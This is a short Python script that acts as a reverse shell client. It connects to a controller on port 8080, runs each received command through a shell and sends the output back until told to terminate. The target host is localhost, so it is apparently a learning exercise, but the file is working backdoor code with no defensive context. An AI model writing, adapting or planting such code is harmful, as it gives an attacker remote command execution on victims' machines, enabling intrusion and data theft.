import socket
from subprocess import Popen, PIPE

server_port = 8080

def connect(server_ip):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((server_ip, server_port))
    while True:
        command = so.recv(1024)
        if 'terminate' in command:
            so.close()
            break
        else:
            CMD = Popen(command, shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE)
            so.send(CMD.stdout.read())
            so.send(CMD.stderr.read())
def main():
    server_ip = socket.gethostbyname('localhost')
    connect(server_ip)
main()
